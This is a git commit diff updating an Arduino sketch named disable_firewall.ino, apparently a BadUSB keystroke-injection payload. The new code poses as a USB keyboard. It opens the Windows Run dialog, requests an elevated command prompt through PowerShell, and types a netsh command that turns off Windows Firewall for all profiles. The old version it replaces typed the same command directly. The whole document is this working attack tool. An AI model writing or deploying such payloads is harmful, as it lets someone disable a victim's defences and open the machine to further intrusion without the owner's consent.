8331f9a661fd79b7ea5b13d03ceb5365e60f8988
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-01-31 11:28:05 +0330

    Update disable_firewall.ino

--- sketches/disable_firewall.ino
+++ sketches/disable_firewall.ino
@@ -1,14 +1,16 @@
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("cmd /c netsh advfirewall set allprofiles state off");
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("powershell Start-Process cmd -Verb RunAs");
+  delay(1000);
+  Keyboard.println("netsh advfirewall set allprofiles state off");
 }
 
 void loop() {}
